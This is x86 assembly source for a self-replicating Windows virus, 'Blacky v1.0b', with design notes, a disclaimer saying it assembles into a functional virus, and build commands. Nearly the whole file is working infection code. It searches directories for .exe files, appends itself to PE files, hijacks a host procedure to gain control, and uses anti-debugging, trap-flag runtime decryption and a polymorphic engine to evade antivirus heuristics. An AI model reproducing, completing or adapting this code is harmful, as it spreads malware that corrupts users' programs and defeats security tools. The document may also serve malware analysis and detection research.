COMMENT *   
  Blacky.v1.0b by deroko
  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
- supposed to work on win2k/XP, not tested on win9x/me 
- uses dizzy engine to inject redirection to virus poly decryptor
       pushad
       mov    ebx, virus_va
       push   ebx
       ret
       will be stored somwhere in da host file
       dizzy engin starts from entrypoint and all calls are traced
       and stored into dizzy structs, dizzy structs are used to
       find random proc which will be overwriten with above code.
       Due to static analyzing we don't know if proc will be executed
       or not, so viri won't be executed sometimes. I use predefined
       number and insert redirection into the 15th proc.
       If there is not 15 subroutines, file is marked as invalid
       and ain't infected
       In first generation viri should SigSegv when trying to return to
       host =) So this should be considered as normal
       
       When infected file is started, poly decryptor will gain control
       and viri will be executed, after that viri will call 
       VirtualProtectEx and restore original procedure, will restore
       all regs via popad and execution will be returned to original
       program
       
- uses runing line decryption via trap flag to fuck up heuristics 
       - disadvantages - can not use plain strings 
                       - can not setup more exception handlers
                       - intensive error checking
                       - due to decryption/encryption at runtime
                         viri is very very slow...
                       - viri section is writable...   
       - adventages    - the best anti-heuristick and anti-emulation
                         tehnique                  
       - UPDATE        - xor keys used in runing line are randomly 
                         selected which gives us 256 posible combinations
                         of encrypted code + poly   
                       - it is more optimized, and zeroes Dr0/3                
- infection 
       - infects PE exe files
       - doesn't infect files < 50kb
       - inject into last section
       - if last == reloc, move it, and infect section before it
       - scan for next file :D
       - uses REPO - random entry point obsecuring
              - sometimes viri will be executeed, sometimes not
       - if BaseOfCode != SectionEntryPoint file is considered as packed 
         and ain't infected
       - infects current directory, and goes 3 dirs up scaning each upper dir 
- payload
       - messagebox "Blacky v1.0b coded by deroko" 
       - displayed if uptime > 2h
       - uper/lower case randomly selected =)
- poly
       - yes
       - sets SEH frame and zereoes Dr0/Dr3 registers
       - SEH is used at least 3 times during decryption  
       - uses mid-call/jmp(8/32) to give different layout of
         next executed instruction 
- TODO in future versions
       - optimize whole code and rewrite it
       - include search for VirtualProtect/VirtualAllocEx in poly
         so section write flag won't be set anymore and fuck up
         heuristics once and for all
         
coded somwhere in Balcan during some boring spring by deroko         
*

.586p 
.model flat, stdcall
locals
jumps


include              win32api.inc
include              useful.inc
include              mz.inc
include              pe.inc
include              shitheap.inc
include              s2c.inc
include              blacky.inc
virussize            equ           blacky_end-blacky_start
poly_viri_offset     equ           5      ;viri starts from here
uptime               equ           2 * 60 * 60 * 1000   ;2h
.data
                     dd            ?
.code
start:
blacky_start:        call          __eip
__eip:               xor           ecx, ecx
                     pop           ebx
                     sub           ebx, __eip-blacky_start
                     mov           eax, ebx                    
                     add           eax, seh32bin - blacky_start
                     push          eax
                     push          dword ptr FS:[ecx]
                     mov           dword ptr FS:[ecx], esp
                     pushfd
                     or            dword ptr[esp], 100h
                     popfd
                     jmp           __runingline
                     db            "START",0
crypt_start:
__runingline:        mov           ebp, ebx
                     add           ebp, virussize
                     mov           [ebp.virus_va], ebx
                     call          getkernelbase
                     mov           [ebp.kernel32], eax 
                     lea           edi, [ebp.pCreateFileA]
                     lea           esi, [ebx+kernelapis-blacky_start]
                     mov           ecx, kernelapisnum
                     mov           ebx, eax
                     call          loadapis
;-----------------------------------------------------------------------------
;Send nice message to debugger =)
;-----------------------------------------------------------------------------                     
                     x_push        ebx, <It is not nice to trace someones work~>
                     push          esp
                     call          [ebp.pOutputDebugStringA]
                     x_pop       
;-----------------------------------------------------------------------------
;check for userland debugger not useful, but let put it anyway
;-----------------------------------------------------------------------------
                     call          [ebp.pIsDebuggerPresent]
                     test          eax, eax
                     jz            __atom
                     push          -1
                     ret
;-----------------------------------------------------------------------------
;check by means of atom if virus is already loaded in memory
;-----------------------------------------------------------------------------                    
__atom:
                     x_push        ebx, blacky~
                     push          esp
                     call          [ebp.pGlobalFindAtomA]
                     x_pop
                     test          ax, ax
                     jnz           __atom_present
                     x_push        ebx, blacky~
                     push          esp
                     call          [ebp.pGlobalAddAtomA]
                     x_pop
                     and           eax, 0000FFFFh
                     mov           [ebp.atom], eax

;-----------------------------------------------------------------------------
;Allocate buffer for dizzy structs
;-----------------------------------------------------------------------------
                     xor           eax, eax
                     push          PAGE_READWRITE
                     push          MEM_COMMIT + MEM_TOP_DOWN
                     push          1000h
                     push          eax
                     dec           eax
                     push          eax
                     call          [ebp.pVirtualAllocEx]
                     test          eax, eax
                     jz            __return_to_host
                     mov           [ebp.dizzyptr], eax
                                          
;-----------------------------------------------------------------------------
;find files   1st allocate memory for WIN32_FIND_DATA struct
;-----------------------------------------------------------------------------                                         
                     xor           eax, eax
                     push          PAGE_READWRITE
                     push          MEM_COMMIT + MEM_TOP_DOWN
                     push          1000h                       ;1page, to much but who cares
                     push          eax
                     dec           eax
                     push          eax
                     call          [ebp.pVirtualAllocEx]
                     test          eax, eax
                     jz            __return_to_host
                     
                     mov           [ebp.wfdata], eax
                     call          loop_dirs
                     call          payload
                     jmp           __return_to_host
;-----------------------------------------------------------------------------
;payload             -             display nice message if uptime > 2h
;-----------------------------------------------------------------------------
payload:
                     pushad
                     call          [ebp.pGetTickCount]
                     cmp           eax, uptime
                     jb            __exit_payload
                     xor           eax, eax
                     push          PAGE_READWRITE
                     push          MEM_COMMIT + MEM_TOP_DOWN
                     push          1000h
                     push          eax
                     dec           eax
                     push          eax
                     call          [ebp.pVirtualAllocEx]
                     test          eax, eax
                     jz            __exit_payload
                     mov           [ebp.payload_buf], eax
                     x_push        eax, <user32.dll~>
                     push          esp
                     call          [ebp.pLoadLibraryA]
                     x_pop
                     
                     gethash       <MessageBoxA>
                     push          hash
                     push          eax
                     call          getprocaddress
                     mov           [ebp.pMessageBoxA], eax
                     
                     mov           edi, [ebp.payload_buf]
                     mov           eax, 'calB'
                     stosd
                     mov           eax, 'v yk'
                     stosd
                     mov           eax, 'b0.1'
                     stosd
                     mov           eax, 'doc '
                     stosd
                     mov           ax,  'de'
                     stosw
                     mov           eax, ' yb '
                     stosd
                     mov           eax,  'ored' 
                     stosd
                     mov           eax, 'ok'
                     stosd
                     call          __mix_uper_lower
                                         
                     xor           eax, eax
                     push          eax
                     push          [ebp.payload_buf]
                     push          [ebp.payload_buf]
                     push          eax
                     call          [ebp.pMessageBoxA]
__freebuffer:        xor           eax, eax
                     push          MEM_DECOMMIT
                     push          1000h
                     push          [ebp.payload_buf]
                     dec           eax
                     push          eax
                     call          [ebp.pVirtualFreeEx]
                     
__exit_payload:      popad
                     ret                     

__mix_uper_lower:
                     mov           edi, [ebp.payload_buf]
__spin_mix:          mov           cl, byte ptr[edi]
                     or            cl, 20h
                     cmp           cl, 61h
                     jb            __inc
                     cmp           cl, 7Ah
                     ja            __inc
                     call          __rnd
                     test          eax, eax             ;1 upper 0 lower
                     jnz           __upper
                     or            byte ptr[edi], 20h   ;lower case
                     jmp           __inc
__upper:             and           byte ptr[edi], 0DFh  ;upper case
__inc:               inc           edi
                     cmp           byte ptr[edi], 0
                     jne           __spin_mix
                     ret
                     
__rnd:
                     rdtsc
                     add           eax, edx
                     and           eax, 1h
                     ret
;-----------------------------------------------------------------------------
;loop_dirs           -             dot/dot goes 3 dirs up
;-----------------------------------------------------------------------------
loop_dirs:
                     call          scan_dir                   ;scan current directory
                     mov           ecx, 3
__loop_dirs:         pushad
                     push          '..'
                     push          esp
                     call          [ebp.pSetCurrentDirectoryA]
                     add           esp, 4
                     call          scan_dir
                     popad
                     loop          __loop_dirs
                     ret                     
;-----------------------------------------------------------------------------
;scan_dir            -             scans direcotry for *.exe files
;-----------------------------------------------------------------------------
scan_dir:                     
                     mov           esi, [ebp.wfdata]
                     x_push        ebx, <*.exe~>
                     mov           ebx, esp
                    	
                    	push          esi
                    	push          ebx                    
                     call          [ebp.pFindFirstFileA]
                     x_pop
                     test          eax, eax
                     jz            __exit_scan_dir
                     mov           [ebp.findhandle], eax
                     lea           ebx, [esi.WFD_szFileName]
                     call          infect
__loop_files:
                     push          esi
                     push          [ebp.findhandle]
                     call          [ebp.pFindNextFileA]
                     test          eax, eax
                     jz            __exit_scan_dir
                     lea           ebx, [esi.WFD_szFileName]
                     call          infect
                     jmp           __loop_files                    
__exit_scan_dir:     ret                                         
;-----------------------------------------------------------------------------
;getkernelbase       -             eax = kernel32.dll base address
;-----------------------------------------------------------------------------
getkernelbase:
                     pushad
                     xor           edx, edx
                     mov           esi, dword ptr FS:[edx]
__seh:               lodsd
                     cmp           eax, 0FFFFFFFFh
                     je            __kernel
                     mov           esi, eax
                     jmp           __seh  
__kernel:            mov           edi, dword ptr[esi+4]         
                     and           edi, 0FFFF0000h     
__spin:              cmp           word ptr[edi], 'ZM'      
                     jz            __test_pe
                     sub           edi, 10000h
                     jmp           __spin  
__test_pe:           mov           ebx, edi
                     add           ebx, [ebx.MZ_lfanew]
                     cmp           word ptr[ebx],'EP'
                     je            __exit_k32
                     jmp           __spin   
__exit_k32:          mov           [esp.Pushad_eax], edi
                     popad
                     ret
;-----------------------------------------------------------------------------
;getprocaddress      -             dllbase, hash
;                    -             eax = API address, 0 error
;-----------------------------------------------------------------------------                     
getprocaddress:
                     pushad                   
                     mov           ebx, dword ptr[esp+8*4+4]
                     mov           ecx, ebx
                     add           ebx, [ebx.MZ_lfanew]			
                     mov           ebx, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
                     add           ebx, ecx
                     mov           edi, [ebx.ED_AddressOfNames]
                     add           edi, ecx
                     xor           esi, esi                           ;esi counter                  				
__find_api:          lea           edx, dword ptr[edi+esi*4]
                     mov           edx, dword ptr[edx]			
                     add           edx, ecx				
                     xor           eax, eax				
__1:                 rol           eax, 7					;hash algo  (x) by z0mbie
                     xor           al, byte ptr [edx]
                     inc           edx					
                     cmp           byte ptr [edx], 0			
                     jnz           __1					
                     cmp           eax, dword ptr[esp+8+8*4]             	       
                     je            __find_ordinal				    
                     inc           esi					
                     cmp           esi, [ebx.ED_NumberOfNames]		
                     jb            __find_api                    
__find_ordinal:      mov           edx, [ebx.ED_AddressOfOrdinals]	
                     add           edx, ecx				
                     movzx         edx, word ptr [edx+esi*2]		
                     mov           eax, [ebx.ED_AddressOfFunctions]	
                     add           eax, ecx				
                     mov           eax, [eax+edx*4]			
                     add           eax, ecx
                     mov           [esp.Pushad_eax], eax
                     popad				
__end:	       	ret           8                    

;-----------------------------------------------------------------------------
;loadapis            -             esi - api hash array
;                                  edi - api jmp table
;                                  ebx - dll base
;                                  ecx - number of apis
;-----------------------------------------------------------------------------
loadapis:
__loadapis:          lodsd
                     push          eax
                     push          ebx
                     call          getprocaddress
                     stosd
                     loop          __loadapis
                     ret

;-----------------------------------------------------------------------------
;infect              -             ebx file name
;-----------------------------------------------------------------------------                    
infect:
                     pushad                                    
                     mov           [ebp.fname], ebx
                     xor           eax, eax
                     push          eax
                     push          eax
                     push          OPEN_EXISTING
                     push          eax
                     push          eax
                     push          GENERIC_READ
                     push          ebx
                     call          [ebp.pCreateFileA]
                     inc           eax
                     jz            __exit_infect
                     dec           eax
                     mov           [ebp.fd], eax
                     xor           ebx, ebx
                     push          ebx
                     push          eax
                     call          [ebp.pGetFileSize]
                     mov           [ebp.fsize], eax
                     cmp           eax, 0C500h                        ;50kb
                     jb            __close_infect                     ;don't infect small files
                     
                     xor           eax, eax
                     push          eax
                     push          eax
                     push          eax
                     push          PAGE_READONLY
                     push          eax
                     push          [ebp.fd]
                     call          [ebp.pCreateFileMappingA]
                     test          eax, eax
                     jz            __close_infect
                     mov           [ebp.temp], eax
                     
                     xor           eax, eax
                     push          eax
                     push          eax
                     push          eax
                     push          FILE_MAP_READ
                     push          [ebp.temp]
                     call          [ebp.pMapViewOfFile]
                     test          eax, eax
                     jz            __close_temp
                     mov           [ebp.memptr], eax
                     
                     mov           ebx, eax
                     cmp           dword ptr[ebx+40h], signature
                     je            __unmap
                     cmp           dword ptr[ebx+40h], invalid
                     je            __unmap
                     cmp           word ptr[ebx], 'ZM'
                     jne           __unmap
                     add           ebx, dword ptr[ebx.MZ_lfanew]
                     cmp           ebx, [ebp.memptr]
                     jb            __unmap
                     add           eax, 1000h
                     cmp           eax, ebx
                     jb            __unmap
                     cmp           word ptr[ebx], 'EP'
                     jne           __unmap
                     call          closeall

                     ;open file again
                     xor           eax, eax
                     push          eax
                     push          eax
                     push          OPEN_EXISTING
                     push          eax
                     push          eax
                     push          GENERIC_READ + GENERIC_WRITE
                     push          [ebp.fname]
                     call          [ebp.pCreateFileA]
                     inc           eax
                     jz            __close_infect
                     dec           eax
                     mov           [ebp.fd], eax
                     
                     add           [ebp.fsize], section     
                     xor           ebx, ebx
                     push          ebx
                     push          [ebp.fsize]
                     push          ebx
                     push          PAGE_READWRITE
                     push          ebx
                     push          eax
                     call          [ebp.pCreateFileMappingA]
                     test          eax, eax
                     jz            __close_infect
                     mov           [ebp.temp], eax
                     
                     xor           ebx, ebx
                     push          [ebp.fsize]
                     push          ebx
                     push          ebx
                     push          FILE_MAP_ALL_ACCESS	
                     push          eax
                     call          [ebp.pMapViewOfFile]
                     test          eax, eax
                     jz            __close_temp
                     mov           [ebp.memptr], eax
                     ;ok we have incresed file size for 12kbs and now inject viri into it!!
                     mov           dword ptr[eax+40h], signature
                     mov           ebx, eax
                     add           ebx, [ebx.MZ_lfanew]
                     mov           edx, ebx
                     add           edx, size IMAGE_NT_HEADERS
                     mov           esi, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
                     movzx         ecx, [ebx.NT_FileHeader.FH_NumberOfSections]
__spin_ep:           cmp           esi, [edx.SH_VirtualAddress]
                     jb            __next_sec
                     mov           edi, [edx.SH_VirtualAddress]
                     add           edi, [edx.SH_SizeOfRawData]
                     cmp           esi, edi
                     jb            __gotep
__next_sec:          add           edx, size IMAGE_SECTION_HEADER
                     loop          __spin_ep             
__gotep:
                     mov           edi, [ebx.NT_OptionalHeader.OH_BaseOfCode]       
                     cmp           [edx.SH_VirtualAddress], edi                            ;packed/protected??
                     je            __continue
                     mov           eax, [ebp.memptr]
                     mov           dword ptr[eax+40h], invalid
                     jmp           __unmap
__continue:                     
                     mov           [ebp.entrypointsec], edx
                     sub           esi, [edx.SH_VirtualAddress]
                     add           esi, [edx.SH_PointerToRawData]
                     add           esi, [ebp.memptr]
                     mov           [ebp.entrypoint], esi
                     
                     ;before starting dizzy engin I have to decrypt tables in dizzy engin
                     call          cryptdecrypttables
                     ;zero out dizzy table
                     pushad
                     mov           edi, [ebp.dizzyptr]
                     mov           ecx, 1000h
                     shr           ecx, 2
                     xor           eax, eax
                     rep           stosd
                     
                     mov           ecx, [ebp.memptr]
                     add           ecx, [ebx.NT_OptionalHeader.OH_SizeOfImage]
                     
                     push          ecx
                     push          [ebp.dizzyptr]
                     push          esi
                     push          [ebp.dizzyptr]
                     call          dizzy
                     call          cryptdecrypttables
                     inc           eax
                     jnz           __ok
                     mov           eax, [ebp.memptr]
                     mov           dword ptr[eax+40h], invalid
                     popad
                     jmp           __unmap
__ok:                popad 
                     movzx         eax, [ebx.NT_FileHeader.FH_NumberOfSections]
                     dec           eax
                     imul          eax, eax, size IMAGE_SECTION_HEADER
                     add           eax, ebx
                     add           eax, size IMAGE_NT_HEADERS
                     mov           edi, [eax.SH_VirtualAddress]
                     cmp           edi, [ebx.NT_OptionalHeader.OH_DataDirectory[5*8].DD_VirtualAddress]
                     jne           __skip0                            ;reloc? move or not
                     mov           ecx, [eax.SH_SizeOfRawData]
                     mov           esi, [eax.SH_PointerToRawData]
                     add           esi, ecx                           ;ecx size of RawData
                     add           esi, [ebp.memptr]
                     mov           edi, esi
                     add           edi, section
                     std
                     rep           movsb                              ;copy backward
                     add           [eax.SH_VirtualAddress], section
                     add           [eax.SH_PointerToRawData], section
                     add           [ebx.NT_OptionalHeader.OH_DataDirectory[5*8].DD_VirtualAddress], section
                     sub           eax, size IMAGE_SECTION_HEADER
__skip0:                   
                     mov           edi, [eax.SH_PointerToRawData]
                     add           edi, [eax.SH_SizeOfRawData]
                     add           edi, [ebp.memptr]
                     mov           [ebp.virus_file_raw], edi               ;stor for later use                     
                     add           edi, poly_viri_offset                   ;copy viri and make space for poly
                     mov           esi, [ebp.virus_va]
                     mov           ecx, virussize
                     ;cld
                     ;rep           movsb
                     call          gencopy                                 ;needs to create new copier
                     lea           edx, [ebp.new_copier]
                     call          edx
                     ;calculate VA of virus
                     add           [eax.SH_SizeOfRawData], section
                     add           [eax.SH_VirtualSize], section
                     add           [ebx.NT_OptionalHeader.OH_SizeOfImage], section
                     or            [eax.SH_Characteristics], IMAGE_SCN_MEM_WRITE
                     mov           edi, [ebp.virus_file_raw]
                     sub           edi, [ebp.memptr]
                     sub           edi, [eax.SH_PointerToRawData]
                     add           edi, [eax.SH_VirtualAddress]
                     add           edi, [ebx.NT_OptionalHeader.OH_ImageBase]
                     mov           [ebp.virus_memory_va], edi
                     
                     ;find right procedure to inject into it
                     mov           edi, [ebp.dizzyptr]
                     mov           ecx, 15 ;skip 15 procs 
__spin_dizzy:        
                     jecxz         __got_dizzy
                     dec           ecx
                     add           edi, size dizzy_struct
                     jmp           __spin_dizzy 
__got_dizzy:         cmp           [edi.dizzy_start], 0
                     jne           __skip1
                     mov           eax, [ebp.memptr]
                     mov           dword ptr[eax+40h], invalid
                     jmp           __unmap
__skip1:
                     ;insert REPO, store old proc in file and fill with right data
                     ;(def data size = 8) can be changed in some other viri version to generate
                     ;more complex decryptor
                     mov           ecx, [edi.dizzy_end]
                     sub           ecx, [edi.dizzy_start]
                     cmp           ecx, 8
                     jae           __skip2
                     mov           eax, [ebp.memptr]
                     mov           dword ptr[eax+40h], invalid
                     jmp           __unmap             
__skip2:                                          
                     ;save old data
                     mov           eax, [ebp.virus_file_raw]
                     add           eax, poly_viri_offset
                     add           eax, oldhostdata - blacky_start
                     mov           ecx, [ebp.entrypointsec]
                     mov           edx, [edi.dizzy_start]
                     sub           edx, [ebp.memptr]
                     sub           edx, [ecx.SH_PointerToRawData]
                     add           edx, [ecx.SH_VirtualAddress]
                     add           edx, [ebx.NT_OptionalHeader.OH_ImageBase]
                     mov           dword ptr[eax], edx
                     mov           dword ptr[eax+4], 8
                     push          edi
                     mov           esi, [edi.dizzy_start]
                     lea           edi, dword ptr[eax+8]
                     mov           ecx, 8
                     cld
                     rep           movsb
                     pop           edi
                     mov           edi, [edi.dizzy_start]
                     call          genloader1
                     ;thats it -> file infected REPO set....weheeeeeeeeee
                     ;decrypt it using current key and set new random key
                     mov           esi, [ebp.virus_file_raw]
                     add           esi, poly_viri_offset
                     add           esi, crypt_start - blacky_start    ;maped crypted file
                     mov           edi, [ebp.virus_va]
                     add           edi, xor_key - blacky_start
                     mov           ecx, end_crypt - crypt_start
                     movzx         ebx, byte ptr[edi]
__decrypt:           dec           ecx
                     xor           byte ptr[esi+ecx], bl
                     test          ecx, ecx
                     jnz           __decrypt
                     rdtsc
                     add           eax, edx
                     ;al has random key
                     mov           ecx, end_crypt - crypt_start
__crypt:             dec           ecx
                     xor           byte ptr[esi + ecx] , al
                     test          ecx, ecx
                     jnz           __crypt
                     ;now patch SEH to set new values
                     mov           esi, [ebp.virus_file_raw]
                     add           esi, poly_viri_offset
                     add           esi, xor_key - blacky_start
                     mov           byte ptr[esi], al
                     ;set imagebase and prev to 0
                     mov           esi, [ebp.virus_file_raw]
                     add           esi, poly_viri_offset
                     add           esi, imagebase - blacky_start
                     xor           eax, eax
                     mov           dword ptr[esi], eax         ;pacth imagebase to 0
                     mov           dword ptr[esi+4], eax       ;patch prev_instr to 0
                     ;generate random key:
                     rdtsc
                     add           eax, edx
                     mov           [ebp.crypt_key], eax
                     
                     ;crypt
                     mov           ecx, virussize
                     shr           ecx, 2
                     mov           eax, [ebp.crypt_key]
                     mov           edi, [ebp.virus_file_raw]
                     add           edi, poly_viri_offset
__spin_crypt:        xor           dword ptr[edi], eax
                     ror           dword ptr[edi], 16
                     sub           dword ptr[edi], eax
                     add           edi, 4
                     loop          __spin_crypt
                     ;now insert poly and that's it
                     mov           edi, [ebp.virus_file_raw]
                     add           edi, virussize
                     add           edi, size blackystruct
                     add           edi, poly_viri_offset
                     mov           esi, [ebp.virus_memory_va]
                     add           esi, poly_viri_offset                           ;crypted virus in memory
                     
                     push          eax                                ;crypt key
                     push          edi                                ;where to generate poly
                     push          virussize
                     push          esi
                     call          poly          

                     mov           edi, [ebp.virus_file_raw]
                     mov           al, 0E8h
                     stosb
                     mov           eax, virussize
                     add           eax, size blackystruct
                     stosd
                     ;DONE finaly -----------------                      
              
__unmap:             push          [ebp.memptr]
                     call          [ebp.pUnmapViewOfFile]
__close_temp:        push          [ebp.temp]
                     call          [ebp.pCloseHandle]                     
__close_infect:      push          [ebp.fd]
                     call          [ebp.pCloseHandle]                                          
__exit_infect:       popad
                     ret
;-----------------------------------------------------------------------------
;closeall            -             close open handles
;-----------------------------------------------------------------------------
closeall:
                     push          [ebp.memptr]
                     call          [ebp.pUnmapViewOfFile]
                     push          [ebp.temp]
                     call          [ebp.pCloseHandle]
                     push          [ebp.fd]
                     call          [ebp.pCloseHandle]
                     ret
;-----------------------------------------------------------------------------
;genloader1          -             generates proc hijack, edi = proc_start
;                                  [ebp.virus_va] = calculated address of viri
;8bytes long so they can inject into any proc
;-----------------------------------------------------------------------------
genloader1:
                     mov           ax, 0BB60h
                     stosw
                     mov           eax, [ebp.virus_memory_va]
                     stosd
                     mov           ax, 0C353h
                     stosw
                     ret                     
;-----------------------------------------------------------------------------
;gencopy             -             generates copy sub outside of main flow
;-----------------------------------------------------------------------------
gencopy:
                     pushad
                     lea           edi, [ebp.new_copier]
                     mov           dword ptr[edi], 0C3A4F3FCh
                     mov           esi, [ebp.virus_va]
                     add           esi, xor_key - blacky_start
                     movzx         eax, byte ptr[esi]
                     mov           ecx, 4
__crypt_copy:        dec           ecx
                     xor           byte ptr[edi+ecx], al
                     test          ecx, ecx
                     jnz           __crypt_copy                   
                     popad
                     ret
;-----------------------------------------------------------------------------
;cryptdecrypttables  -             decrypts/encrypts dizzy tables
;-----------------------------------------------------------------------------                     
cryptdecrypttables:                     
                     pushad
                     mov           edi, [ebp.virus_va]
                     mov           esi, edi
                     add           edi, table_start-blacky_start
                     add           esi, xor_key - blacky_start
                     mov           al, byte ptr[esi]
                     mov           ecx, table_end-table_start
__deandencode:       xor           byte ptr[edi], al
                     inc           edi
                     loop          __deandencode
                     popad
                     ret                     


include              dizzy32bin.inc                            ;dizzy engin
include              poly32bin.inc                             ;small polyengin
;------------------------------------------------------------------------------
;trickiest part so far!!! Set new SEH to escape from singlestep...
;------------------------------------------------------------------------------
__return_to_host:
                     ;restore      old host
                     push          [ebp.atom]
                     call          [ebp.pGlobalDeleteAtom]                   ;clear attom
                     
                     push          MEM_DECOMMIT	
                     push          1000h
                     push          [ebp.dizzyptr]
                     push          -1
                     call          [ebp.pVirtualFreeEx]                      ;free memory
                     
                     push          MEM_DECOMMIT
                     push          1000h
                     push          [ebp.wfdata]
                     push          -1
                     call          [ebp.pVirtualFreeEx]                      ;freememory
__atom_present:                     
                     mov           esi, [ebp.virus_va]
                     add           esi, oldhostdata - blacky_start
                     mov           edi, dword ptr[esi]                       ;va of proc
                     
                     pushad
                     push          esp
                     push          esp
                     push          PAGE_READWRITE
                     push          1000h
                     push          edi
                     push          -1
                     call          [ebp.pVirtualProtectEx]                   ;change protections
                     add           esp, 4
                     popad  
                     
                     mov           ebx, dword ptr[esi]
                     add           esi, 8
                     mov           ecx, 8
                     cld
                     rep           movsb
                     
                     xor           edx, edx
                     mov           eax, [ebp.virus_va]
                     add           eax, escape_seh-blacky_start
                     push          eax
                     push          dword ptr FS:[edx]
                     mov           dword ptr FS:[edx], esp
end_crypt:
                     db            "END", 0                                  ;filled with NOPS
                                                                             ;int1 caught by secon seh
                     xor           edx, edx
                     add           esp, 8                                    ;align stack
                     pop           dword ptr FS:[edx]                        ;restore default SEH
                     add           esp, 4                                    ;align stack
                     
                     mov           [esp.Pushad_eax], ebx
                     popad
                     push          eax
                     ret                                                     ;go back to host
escape_seh:
                     mov           ebx, dword ptr[esp+0ch]
                     and           [ebx.CONTEXT_EFlags], 0FFFFFEFFh          ;clear trap flag
                     xor           eax, eax
                     ret
                     
include              seh32bin.inc                                        ;runtime decryption xor 0DEh key
oldhostdata          label         byte
                     dd            ?                           ;VA of old proc
                     dd            ?                           ;size of old proc
                     db            64     dup(0FFh)            ;data copied from old proc                    
kernelapis:
whash                <CreateFileA, CreateFileMappingA, MapViewOfFile, FindFirstFileA, FindNextFileA>
whash                <SetCurrentDirectoryA, OutputDebugStringA, GlobalAddAtomA, GlobalDeleteAtom>
whash                <GlobalFindAtomA, CloseHandle, UnmapViewOfFile, VirtualAllocEx, VirtualFreeEx>
whash                <LoadLibraryA, ExitProcess, GetFileSize, VirtualProtectEx, IsDebuggerPresent>
whash                <GetTickCount>
kernelapisnum        equ    ($-kernelapis)/4            
blacky_end:                                   
;________________________ data starts from here ___________________________    
end                  start

dislaimer

This code is for research and educational purposes only. The assembling
of this file will produce a fully functional virus. Anyway, assembling won't
produce whole virus, you'll need to encrypt it via runtime.c. If you assemble
and encrypt virus you know what you are doing, and as such you will be responsible
for any damage that is produces by mis-use of this source code. Writing viruses
is not iligal but spreading binary viruses is ilegal. So you have been worned.
Author of this virus may not be held responsible for the acts of a lamers. 
Everybody should be responsible for their own acts, the first and basic 
rule of every criminal law.
This source code is provided "as is". The deliberated modification of this
source code will derive in a new virus that must not be considered the virus
sourced here.
                                   deroko        april/may 2005  

COMPILE:
tasm32 /ml /z /m3 /q  blacky
tlink32 -x /Tpe /aa /c blacky,,,import32.lib
pewrite blacky.exe
runtime blacky.exe             